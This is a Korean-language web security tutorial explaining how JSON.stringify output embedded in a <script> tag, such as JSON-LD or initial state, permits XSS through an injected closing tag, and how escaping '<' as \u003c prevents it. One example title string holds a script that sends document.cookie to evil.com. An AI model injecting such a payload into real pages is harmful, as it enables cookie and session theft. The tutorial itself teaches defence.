SEO를 위해 검색엔진에 구조화 데이터를 알려주는 JSON-LD를 `<script type="application/ld+json">`에 심거나, 서버에서 만든 초기 상태를 `window.__INITIAL_STATE__`에 박아 클라이언트로 넘기는 패턴은 어디서나 보인다. 그때 데이터를 `JSON.stringify`로 직렬화하니 "이건 안전하다"고 넘긴 적이 있는가. 그 믿음은 `<script>` 태그 안이라는 특수한 자리에서 조용히 깨진다.

> 한 줄 요약: **이스케이프는 문맥(context)을 탄다. `JSON.stringify`는 JSON 문맥의 직렬화기일 뿐, `<script>` 태그라는 HTML 문맥에서의 탈출은 막지 못한다.**

## 브라우저는 script 안을 "글자 덩어리"로만 본다

먼저 브라우저의 HTML 파서가 `<script>` 안을 어떻게 읽는지부터 잡아야 한다. 파서는 `<script>` 안의 내용을 JavaScript로 **해석하지 않는다**. 그 안은 "raw text", 즉 그냥 글자 덩어리로 취급되고, 파서가 거기서 찾는 건 단 하나, **닫는 태그 문자열**(슬래시가 들어간 `</script` 형태)뿐이다.

여기서 결정적인 사실 하나. 파서는 그 닫는 태그 문자열이 "JS 문자열 리터럴 안"에 들어 있다는 사정을 **전혀 모른다**. 따옴표로 감싼 안쪽이든 바깥이든, 글자만 맞으면 거기서 태그를 닫아버린다.

```
<script>
  window.__STATE__ = {"title":"...</script><script>evil()..."};
                              ▲
                  파서: "어, 닫는 태그다!" 여기서 script 끊김
                              │
        ┌─────────────────────┴──────────────────────┐
        │ 앞쪽 script 종료                            │
        │ 뒤에 새 <script>evil()...</script>가 생김   │ ← 이게 실행된다
        └────────────────────────────────────────────┘
```

JS 입장에선 그저 `title` 문자열 안에 든 글자였지만, 파서 입장에선 명백한 닫는 태그다. 이 시각의 어긋남이 사고의 출발점이다.

> 왜 이렇게 설계했나? HTML 파서가 `<script>` 안에서 JS 문법까지 이해하려 들면, 파서가 JS 엔진을 통째로 품어야 한다. 그래서 명세는 파서의 일을 "닫는 토큰만 찾기"로 단순하게 못박았다. 단순함의 대가로, "데이터 안에 닫는 태그 문자열이 섞이는 경우"의 책임은 데이터를 심는 쪽에 넘어온다.

## JSON.stringify가 하는 일과 안 하는 일

그럼 `JSON.stringify`는 무엇을 이스케이프하나. 정확히 "JSON이라는 문맥에서 깨지면 안 되는 것"만 처리한다.

| 문자              | JSON.stringify 처리      | 이유                               |
| ----------------- | ------------------------ | ---------------------------------- |
| `"` (큰따옴표)    | `\"`로 이스케이프 O      | JSON 문자열의 경계라서 깨면 안 됨  |
| `\` (역슬래시)    | `\\`로 이스케이프 O      | 이스케이프 시작 문자라서 처리 필요 |
| 제어문자(개행 등) | `\n` 등으로 이스케이프 O | JSON 문자열 안에 raw로 못 넣음     |
| `<`, `>` (꺾쇠)   | 그대로 둠 X              | JSON 스펙상 이스케이프 의무가 없음 |
| `&` (앰퍼샌드)    | 그대로 둠 X              | 마찬가지로 JSON에선 특별할 게 없음 |

핵심은 마지막 두 줄이다. `<`와 `>`는 JSON 문법에서 아무 의미가 없으므로 `JSON.stringify`는 손대지 않는다. 그 결과, 출력 문자열 안에 `</script>`라는 글자 조합이 **그대로 살아남을 수 있다**. JSON 문맥에선 완벽히 정상인 출력이, HTML 문맥으로 옮겨지는 순간 흉기가 되는 셈이다. 직렬화기는 자기 일을 다 했다. 그저 그 일이 "HTML 안전"과는 다른 일이었을 뿐이다.

## 공격은 평범한 데이터로 들어온다

특별한 입력이 필요하지도 않다. 글 제목이나 댓글 같은 평범한 사용자 입력 자리에 닫는 태그 + 악성 태그가 섞이면 된다.

```ts
// 사용자가 글 제목에 이런 문자열을 넣었다고 하자
const post = {
  title: '맛집 후기</script><script>fetch("//evil.com?c="+document.cookie)</script>',
};

// JSON-LD든 초기 상태든, 이걸 script 안에 직렬화해 넣는 순간
const html = `<script type="application/ld+json">${JSON.stringify(post)}</script>`;
// 브라우저 파서는 title 안의 </script>에서 태그를 닫고,
// 뒤따르는 <script>fetch(...)</script>를 실제로 실행한다
```

여기서 오해하기 쉬운 지점. 이건 서버에서 문자열을 직접 조립할 때만의 문제가 아니다. React에서 `dangerouslySetInnerHTML`로 JSON-LD 스크립트를 그려도, 서버 템플릿에서 문자열을 이어 붙여도, **HTML 문맥에 직렬화 결과를 그대로 흘려보내는 순간** 동일하게 당한다. 통로가 무엇이든 문맥이 같으면 결과도 같다.

## 방어는 주입 직전, 한 줄이면 된다

해법은 데이터를 HTML 문맥에 심기 **직전에**, 파서가 닫는 태그를 못 찾도록 `<`를 막는 것이다.

```ts
const safe = JSON.stringify(data).replace(/</g, '\\u003c');
```

`\u003c`는 `<`를 유니코드 코드포인트로 표현한 형태다. JSON/JS 문자열 안에서 `\u003c`는 `<`와 **파싱 결과가 100% 동일**하다 — 즉 데이터 값은 글자 하나 안 바뀐다. 그런데 HTML 파서 눈에는 더 이상 `<`가 보이지 않으니, `</script>`라는 닫는 태그 문자열을 영영 찾지 못한다. 부작용 0인 한 줄 방어다.

```
원본:  ..."</script>..."     → 파서가 닫는 태그 발견 (위험)
방어:  ..."\u003c/script>..." → 파서 눈엔 < 가 없음 (안전)
        ↑ JS가 읽으면 똑같이 "</script>" 라는 글자로 복원됨
```

보너스로 한 줄 더 챙기면 완벽해진다. `U+2028`(줄 구분자)과 `U+2029`(문단 구분자)는 JS 문자열 리터럴 안에서 **줄바꿈으로 해석돼 문법 오류**를 일으킬 수 있는 문자다. 이 둘도 같은 방식으로 이스케이프한다.

```ts
const safe = JSON.stringify(data)
  .replace(/</g, '\\u003c')
  .replace(/\u2028/g, '\\u2028')
  .replace(/\u2029/g, '\\u2029');
```

Next.js 같은 프레임워크가 자기가 심는 데이터(예: 하이드레이션 상태)에 대해 내부적으로 바로 이 처리를 해준다. 단, 안심하기엔 이르다. **내가 직접 `<script>`를 조립하는 순간 그 책임은 프레임워크가 아니라 나에게 온다.**

> 왜 `<`만 막아도 충분한가? 파서가 `<script>` raw text 모드에서 빠져나오는 트리거는 오직 `<`로 시작하는 닫는 태그뿐이다. `<` 하나만 글자에서 코드 트리거로의 승격을 막으면, 그 뒤가 어떤 문자열이든 파서는 계속 raw text로만 읽는다. 가장 좁은 한 곳을 막아 가장 넓은 표면을 닫는 셈이다.

## 원칙: 경계에서, 그 문맥의 규칙으로 이스케이프한다

이 한 줄 방어를 외우는 것보다 중요한 건 그 뒤의 원칙이다. 데이터가 신뢰 경계(trust boundary, 신뢰할 수 있는 영역과 없는 영역의 분기점)를 넘는 **바로 그 지점에서, 그 문맥의 규칙으로** 이스케이프한다 — "경계에서 이스케이프(sanitize at the boundary)".

| 데이터가 들어가는 곳 | 위험한 문자           | 누가 이스케이프하나      |
| -------------------- | --------------------- | ------------------------ |
| HTML 본문 (JSX 자식) | `<`, `>`, `&`         | React가 자동으로         |
| `<script>` 안의 JSON | `<`, U+2028/U+2029    | **내가 직접** (위 한 줄) |
| URL 속성 (href 등)   | `javascript:` 등 스킴 | 내가 스킴 검증으로       |

React의 `{children}`이 안전한 이유는, React가 **HTML 문맥에 대한 이스케이프를 자동으로** 해주기 때문이다. 하지만 `<script>` 안은 React가 손대주는 HTML 문맥이 아니라, 내가 직접 문자열을 만들어 넣는 별개의 문맥이다. 같은 데이터라도 어느 문맥으로 가느냐에 따라 막아야 할 문자가 다르다 — 이게 이스케이프가 문맥을 탄다는 말의 실체다. XSS 일반론과 컨텍스트별 이스케이프 원칙은 [[web-security-xss-csrf]]에서 더 넓게 다룬다.

마지막 습관 하나. 한번 당했거나 위험하다고 판단한 악성 입력 문자열을 **회귀 테스트로 고정**해두면, 나중에 직렬화 코드를 리팩토링하다 방어가 빠지는 사고를 막을 수 있다.

## 흔한 오해

- **오해**: "`JSON.stringify`를 거쳤으니 이스케이프는 끝났다." → **실제**: 그건 JSON 문맥에서의 이스케이프일 뿐이다. `<`, `>`, `&`는 JSON 스펙상 손대지 않으므로 `</script>`가 출력에 그대로 살아남는다. HTML 문맥으로 넘어가는 순간 다시 이스케이프해야 한다.
- **오해**: "React를 쓰면 XSS에서 자유롭다." → **실제**: React의 자동 이스케이프는 `{children}` 같은 HTML 본문 문맥에만 적용된다. `dangerouslySetInnerHTML`로 그린 스크립트나 내가 직접 조립한 `<script>`는 React 관할 밖이고, 그 책임은 내게 있다.
- **오해**: "JSON-LD는 검색엔진용 메타데이터라 위험하지 않다." → **실제**: 그 안에 글 제목·설명 같은 본문 텍스트가 그대로 들어간다. 사용자가 제목에 닫는 태그를 심으면 그게 그대로 마크업으로 해석된다.
- **오해**: "꺾쇠를 `&lt;` 같은 HTML 엔티티로 바꾸면 된다." → **실제**: `<script>` 안은 raw text라 HTML 엔티티가 디코딩되지 않는다. `&lt;`는 글자 그대로 데이터에 섞여 JSON을 깨뜨린다. 여기선 JS 문맥에서 유효한 `<`를 써야 한다.

## 스스로 점검하기

- 브라우저 HTML 파서는 `<script>` 안을 어떻게 취급하며, 그 안에서 무엇을 트리거로 태그를 닫나?
- `JSON.stringify`가 `<`와 `>`를 이스케이프하지 않는 이유는 무엇이고, 그게 왜 `<script>` 문맥에서만 문제가 되나?
- `\u003c`로 바꿔도 JS가 읽는 데이터 값이 변하지 않는 이유를 설명할 수 있나?
- `<` 하나만 막아도 닫는 `</script>` 태그 주입을 막을 수 있는 이유는 무엇인가?
- React의 자동 이스케이프가 적용되는 문맥과 적용되지 않는 문맥을 구분할 수 있나?
- U+2028/U+2029까지 처리해야 완벽해지는 이유는 무엇인가?
